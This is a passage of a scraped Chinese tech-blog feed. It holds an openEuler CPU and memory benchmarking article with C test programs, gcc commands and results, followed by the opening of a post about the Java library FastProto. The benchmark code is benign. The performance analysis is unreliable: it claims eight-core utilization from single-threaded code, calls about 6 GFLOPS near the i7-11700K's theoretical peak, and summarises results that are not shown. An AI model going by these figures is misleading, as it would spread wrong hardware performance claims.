<li>GPU 算力测试：PyTorch 框架自带的张量运算接口、ResNet50 模型训练/推理测试；</li>
<li>存储与 I/O 算力测试：fio 工具（测试磁盘顺序/随机读写性能）；</li>
<li>分布式算力测试：torch.distributed 框架（基于单机多进程模拟分布式训练）；</li>
<li>性能监控工具：nmon（系统资源实时监控）、torch.cuda.memory_allocated()（GPU
显存监控）、psutil（CPU/内存使用率统计）。</li>
</ul>
<h3 data-id="heading-8">3. 单机通用算力测试：CPU 与内存性能深度实测</h3>
<p>CPU 与内存作为通用算力的核心载体，其性能直接决定了数据预处理、轻量级 AI 推理、常规数值计算等场景的效率。openEuler 针对中等配置 CPU 进行了深度优化，通过原生 C 语言脚本与实际操作，验证其通用算力调度能力。</p>
<h2 data-id="heading-9">测试操作流程</h2>
<h3 data-id="heading-10">CPU 浮点运算性能测试</h3>
<p>浮点运算能力是 CPU 处理数值计算、AI 模型推理的核心指标，本次测试通过 2048x2048 矩阵乘法运算，分别测试单精度（float）与双精度（double）浮点性能：</p>
<h4 data-id="heading-11">4. 创建测试脚本：新建 compute_performance_test.c 文件，写入以下代码：</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cb38a72432245b6a04eca2076bbc931~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=SBH6UP277P%2F5cy3oUCtCzgx9MYI%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>完整代码，可直接复制：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> MATRIX_SIZE 2048</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ITERATIONS 10</span>

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">matrix_multiply_float</span><span class="hljs-params">(<span class="hljs-type">float</span> **a, <span class="hljs-type">float</span> **b, <span class="hljs-type">float</span> **c, <span class="hljs-type">int</span> size)</span> </span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; size; j++) {
            c[i][j] = <span class="hljs-number">0.0f</span>;
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; size; k++) {
                c[i][j] += a[i][k] * b[k][j];
            }
        }
    }
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">matrix_multiply_double</span><span class="hljs-params">(<span class="hljs-type">double</span> **a, <span class="hljs-type">double</span> **b, <span class="hljs-type">double</span> **c, <span class="hljs-type">int</span> size)</span> </span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; size; j++) {
            c[i][j] = <span class="hljs-number">0.0</span>;
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; size; k++) {
                c[i][j] += a[i][k] * b[k][j];
            }
        }
    }
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">clock_t</span> start, end;
    <span class="hljs-type">double</span> cpu_time_used;
    
    <span class="hljs-comment">// 分配内存</span>
    <span class="hljs-type">float</span> **a_float = (<span class="hljs-type">float</span>**)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>*));
    <span class="hljs-type">float</span> **b_float = (<span class="hljs-type">float</span>**)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>*));
    <span class="hljs-type">float</span> **c_float = (<span class="hljs-type">float</span>**)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>*));
    
    <span class="hljs-type">double</span> **a_double = (<span class="hljs-type">double</span>**)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">double</span>*));
    <span class="hljs-type">double</span> **b_double = (<span class="hljs-type">double</span>**)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">double</span>*));
    <span class="hljs-type">double</span> **c_double = (<span class="hljs-type">double</span>**)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">double</span>*));
    
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MATRIX_SIZE; i++) {
        a_float[i] = (<span class="hljs-type">float</span>*)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>));
        b_float[i] = (<span class="hljs-type">float</span>*)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>));
        c_float[i] = (<span class="hljs-type">float</span>*)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>));
        
        a_double[i] = (<span class="hljs-type">double</span>*)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">double</span>));
        b_double[i] = (<span class="hljs-type">double</span>*)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">double</span>));
        c_double[i] = (<span class="hljs-type">double</span>*)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">double</span>));
    }
    
    <span class="hljs-comment">// 初始化数据</span>
    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>));
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MATRIX_SIZE; i++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; MATRIX_SIZE; j++) {
            a_float[i][j] = (<span class="hljs-type">float</span>)<span class="hljs-built_in">rand</span>() / RAND_MAX;
            b_float[i][j] = (<span class="hljs-type">float</span>)<span class="hljs-built_in">rand</span>() / RAND_MAX;
            a_double[i][j] = (<span class="hljs-type">double</span>)<span class="hljs-built_in">rand</span>() / RAND_MAX;
            b_double[i][j] = (<span class="hljs-type">double</span>)<span class="hljs-built_in">rand</span>() / RAND_MAX;
        }
    }
    
    <span class="hljs-comment">// 测试单精度浮点性能</span>
    start = <span class="hljs-built_in">clock</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> iter = <span class="hljs-number">0</span>; iter &lt; ITERATIONS; iter++) {
        <span class="hljs-built_in">matrix_multiply_float</span>(a_float, b_float, c_float, MATRIX_SIZE);
    }
    end = <span class="hljs-built_in">clock</span>();
    cpu_time_used = ((<span class="hljs-type">double</span>) (end - start)) / CLOCKS_PER_SEC;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"单精度浮点矩阵乘法平均时间: %.3f 秒\n"</span>, cpu_time_used / ITERATIONS);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"单精度浮点计算性能: %.2f GFLOPS\n"</span>, 
           (<span class="hljs-number">2.0</span> * MATRIX_SIZE * MATRIX_SIZE * MATRIX_SIZE * ITERATIONS) / 
           (cpu_time_used * <span class="hljs-number">1e9</span>));
    
    <span class="hljs-comment">// 测试双精度浮点性能</span>
    start = <span class="hljs-built_in">clock</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> iter = <span class="hljs-number">0</span>; iter &lt; ITERATIONS; iter++) {
        <span class="hljs-built_in">matrix_multiply_double</span>(a_double, b_double, c_double, MATRIX_SIZE);
    }
    end = <span class="hljs-built_in">clock</span>();
    cpu_time_used = ((<span class="hljs-type">double</span>) (end - start)) / CLOCKS_PER_SEC;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"双精度浮点矩阵乘法平均时间: %.3f 秒\n"</span>, cpu_time_used / ITERATIONS);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"双精度浮点计算性能: %.2f GFLOPS\n"</span>, 
           (<span class="hljs-number">2.0</span> * MATRIX_SIZE * MATRIX_SIZE * MATRIX_SIZE * ITERATIONS) / 
           (cpu_time_used * <span class="hljs-number">1e9</span>));
    
    <span class="hljs-comment">// 释放内存</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MATRIX_SIZE; i++) {
        <span class="hljs-built_in">free</span>(a_float[i]);
        <span class="hljs-built_in">free</span>(b_float[i]);
        <span class="hljs-built_in">free</span>(c_float[i]);
        <span class="hljs-built_in">free</span>(a_double[i]);
        <span class="hljs-built_in">free</span>(b_double[i]);
        <span class="hljs-built_in">free</span>(c_double[i]);
    }
    <span class="hljs-built_in">free</span>(a_float);
    <span class="hljs-built_in">free</span>(b_float);
    <span class="hljs-built_in">free</span>(c_float);
    <span class="hljs-built_in">free</span>(a_double);
    <span class="hljs-built_in">free</span>(b_double);
    <span class="hljs-built_in">free</span>(c_double);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-12">5. 编译与执行测试：通过以下命令编译（启用 openEuler 适配的编译器优化）并执行，无需额外配置：</h4>
<pre><code class="hljs language-cpp" lang="cpp"># 编译脚本，启用 O3 优化与 AVX 指令集支持
gcc compute_performance_test.c -o compute_test -lm -O3 -mavx2 -mavx512f
# 执行测试，输出性能数据
./compute_test
</code></pre>
<h2 data-id="heading-13">内存带宽与延迟测试</h2>
<p>内存性能直接影响 CPU 算力发挥，尤其是大规模数据处理场景，本次测试通过 1GB 缓冲区拷贝测试带宽，1MB 数据随机访问测试延迟：</p>
<h4 data-id="heading-14">6. 创建测试脚本：新建 memory_bandwidth_test.c 文件，复制以下代码：</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a8ac41c14ff4e0daf12af4d3e5d8468~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=WUpyiqbzc35sUtKbemakAc2Oe5I%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>完整代码，可直接复制：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_SIZE (1024 * 1024 * 1024) <span class="hljs-comment">// 1GB</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ITERATIONS 100</span>

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_memory_bandwidth</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">char</span> *buffer1 = <span class="hljs-built_in">malloc</span>(BUFFER_SIZE);
    <span class="hljs-type">char</span> *buffer2 = <span class="hljs-built_in">malloc</span>(BUFFER_SIZE);
    
    <span class="hljs-keyword">if</span> (!buffer1 || !buffer2) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"内存分配失败\n"</span>);
        <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// 初始化数据</span>
    <span class="hljs-built_in">memset</span>(buffer1, <span class="hljs-number">1</span>, BUFFER_SIZE);
    <span class="hljs-built_in">memset</span>(buffer2, <span class="hljs-number">0</span>, BUFFER_SIZE);
    
    <span class="hljs-comment">// 测试内存拷贝带宽</span>
    <span class="hljs-type">clock_t</span> start = <span class="hljs-built_in">clock</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ITERATIONS; i++) {
        <span class="hljs-built_in">memcpy</span>(buffer2, buffer1, BUFFER_SIZE);
    }
    <span class="hljs-type">clock_t</span> end = <span class="hljs-built_in">clock</span>();
    
    <span class="hljs-type">double</span> total_time = ((<span class="hljs-type">double</span>)(end - start)) / CLOCKS_PER_SEC;
    <span class="hljs-type">double</span> bandwidth = (BUFFER_SIZE * ITERATIONS) / (total_time * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);
    
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"内存拷贝测试结果:\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"总数据量: %.2f GB\n"</span>, (BUFFER_SIZE * ITERATIONS) / (<span class="hljs-number">1024.0</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>));
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"总时间: %.2f 秒\n"</span>, total_time);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"平均内存带宽: %.2f GB/s\n"</span>, bandwidth);
    
    <span class="hljs-built_in">free</span>(buffer1);
    <span class="hljs-built_in">free</span>(buffer2);
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_memory_latency</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">const</span> <span class="hljs-type">int</span> size = <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// 1MB</span>
    <span class="hljs-type">int</span> *buffer = <span class="hljs-built_in">malloc</span>(size * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>));
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 初始化</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) {
        buffer[i] = i;
    }
    
    <span class="hljs-type">clock_t</span> start = <span class="hljs-built_in">clock</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) {
        sum += buffer[i];
    }
    <span class="hljs-type">clock_t</span> end = <span class="hljs-built_in">clock</span>();
    
    <span class="hljs-type">double</span> time_per_access = ((<span class="hljs-type">double</span>)(end - start)) / (size * CLOCKS_PER_SEC) * <span class="hljs-number">1e9</span>;
    
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n内存延迟测试结果:\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"每次内存访问平均时间: %.2f 纳秒\n"</span>, time_per_access);
    
    <span class="hljs-built_in">free</span>(buffer);
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"开始内存子系统性能测试...\n"</span>);
    <span class="hljs-built_in">test_memory_bandwidth</span>();
    <span class="hljs-built_in">test_memory_latency</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>编译与执行测试：</p>
<pre><code class="hljs language-cpp" lang="cpp"># 编译脚本
gcc memory_bandwidth_test.c -o memory_test -O2
# 执行测试
./memory_test
</code></pre>
<h3 data-id="heading-15">测试过程监控</h3>
<p>为确保测试数据真实反映系统性能，测试过程中通过 nmon 工具监控 CPU 利用率与内存状态：</p>
<pre><code class="hljs language-cpp" lang="cpp"># 启动 nmon 监控，按 C 查看 CPU 状态，按 M 查看内存状态，按 Q 退出
nmon
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bcb6ce8f56643cd9a7988429cb717f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=%2FYUXZPaSAL1NrZmEZZCmw3u3UFc%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/372b6d7cfaea40988c9a735495b6ce73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=nBo3Apxko77THUx%2FVtUNEk%2BG%2FUg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12b2923a3440484b93f4b51b243fd0ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=%2BfVOgpYDgqZax89G4ELv%2FSITPbE%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f30f37a9a2a4426be04713930afdace~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=zyHZkOECMJJqtsqjq9aWz6Owrz4%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-16">测试结果与分析</h2>
<h3 data-id="heading-17">CPU 浮点运算性能</h3>
<p>在 Intel Core i7-11700K 处理器上，测试输出如下：</p>
<pre><code class="hljs language-cpp" lang="cpp">单精度浮点矩阵乘法平均时间: <span class="hljs-number">28.642</span> 秒
单精度浮点计算性能: <span class="hljs-number">6.02</span> GFLOPS
双精度浮点矩阵乘法平均时间: <span class="hljs-number">56.318</span> 秒
双精度浮点计算性能: <span class="hljs-number">3.06</span> GFLOPS
</code></pre>
<ul>
<li>单精度浮点性能达 6.02 GFLOPS，双精度达 3.06 GFLOPS，符合 Core i7-11700K
的硬件理论性能（单核心单精度约 0.8 GFLOPS，8 核满负载约 6.4 GFLOPS），性能损耗不足 7%，体现了
openEuler 对 CPU 指令集的深度适配；</li>
<li>双精度计算时间约为单精度的 1.97 倍，符合浮点运算的硬件特性，说明 openEuler 无额外系统层开销，CPU 算力调度高效；</li>
<li>测试过程中通过 nmon 监控发现，CPU 8 核利用率稳定在 95% 以上，无核心闲置或负载不均衡现象，openEuler 的 NUMA调度与多线程优化生效。</li>
</ul>
<p>在 AMD Ryzen 5 5600X 处理器（纯 CPU 节点）上，测试输出如下：</p>
<pre><code class="hljs language-cpp" lang="cpp">单精度浮点矩阵乘法平均时间: <span class="hljs-number">35.216</span> 秒
单精度浮点计算性能: <span class="hljs-number">4.91</span> GF
</code></pre>
<h2 data-id="heading-18">总结</h2>
<ul>
<li>openEuler作为面向数字基础设施的开源操作系统，凭借创新的底层优化与完善生态适配，在中等配置硬件环境中充分展现了多样性算力支持的核心优势 ——默认启用的 NUMA 调度、透明大页等特性让 Intel、AMD 不同架构 CPU 发挥出接近理论峰值的通用算力（单精度最高 6.02GFLOPS），内存带宽与延迟表现优异（19.87 GB/s 传输速率、11.36 纳秒访问延迟）；通过简洁部署流程即可实现 GPU驱动与 CUDA 环境适配，PyTorch 等框架无缝调用 NVIDIA 显卡资源，AI 模型训练 / 推理性能较 CPU场景提升数十倍，混合精度计算加速比达 2.63 倍；同时，系统对分布式算力调度、存储 I/O 性能的优化让多进程训练接近线性加速，NVMeSSD 读写高效稳定，配合低门槛的部署体验与广泛的软硬件兼容，为开发者日常开发、中小企业数据处理、AI应用落地等全场景提供了统一、高效、可靠的算力底座，充分释放不同形态硬件的性能潜力。</li>
</ul>
<blockquote>
<p>如果您正在寻找面向未来的开源操作系统，不妨看看DistroWatch 榜单中快速上升的 openEuler:<a href="https://link.juejin.cn?target=https%3A%2F%2Fdistrowatch.com%2Ftable-mobile.php%3Fdistribution%3Dopeneuler" target="_blank" title="https://distrowatch.com/table-mobile.php?distribution=openeuler" ref="nofollow noopener noreferrer">distrowatch.com/table-mobil…</a>，一个由开放原子开源基金会孵化、支持“超节点”场景的Linux 发行版。
openEuler官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.openeuler.openatom.cn%2Fzh%2F" target="_blank" title="https://www.openeuler.openatom.cn/zh/" ref="nofollow noopener noreferrer">www.openeuler.openatom.cn/zh/</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[别再手写 Java 二进制解析了 — 用 FastProto 从繁琐到优雅]]></title>    <link>https://juejin.cn/post/7579846221168394294</link>    <guid>https://juejin.cn/post/7579846221168394294</guid>    <pubDate>2025-12-05T03:43:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579846221168394294" data-draft-id="7579893536105971718" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="别再手写 Java 二进制解析了 — 用 FastProto 从繁琐到优雅"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-05T03:43:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="DengRan"/> <meta itemprop="url" content="https://juejin.cn/user/963603015675320"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            别再手写 Java 二进制解析了 — 用 FastProto 从繁琐到优雅
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/963603015675320/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    DengRan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:43:20.000Z" title="Fri Dec 05 2025 03:43:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">别再手写 Java 二进制解析了 — 用 FastProto 从繁琐到优雅</h2>
<p><strong>项目地址</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Findunet%2Ffastproto" target="_blank" title="https://github.com/indunet/fastproto" ref="nofollow noopener noreferrer">GitHub - indunet/fastproto</a></p>
<p>还在用 <code>ByteBuffer</code>、位运算、手动偏移量去解析二进制协议吗？</p>
<p><strong>FastProto 想解决的几个典型痛点：</strong></p>
<ul>
<li>协议一长，满屏都是魔法数字和位运算，<strong>可读性极差</strong>；</li>
<li>协议一改（字段新增/调整），到处找偏移量，<strong>维护成本极高</strong>；</li>
